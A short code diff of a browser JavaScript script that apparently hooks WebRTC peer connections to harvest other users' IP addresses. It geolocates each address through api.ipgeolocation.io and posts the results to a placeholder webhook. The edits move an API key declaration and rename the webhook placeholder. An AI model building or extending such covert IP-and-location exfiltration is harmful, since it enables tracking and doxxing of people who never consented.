@@ -1,3 +1,5 @@
+let apiKey = "your-api-key";
+
 window.oRTCPeerConnection =
   window.oRTCPeerConnection || window.RTCPeerConnection;
 
@@ -24,10 +26,9 @@ let postujdodc = async (ip) => {
 
   let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
   let random = Math.floor(Math.random() * 100)
-  let apiKey = "your-api-key-here";
 
   var request = new XMLHttpRequest();
-  request.open("POST", "discord-webhook");
+  request.open("POST", "webhook");
   // again, replace the url in the open method with yours
   request.setRequestHeader('Content-type', 'application/json');
 
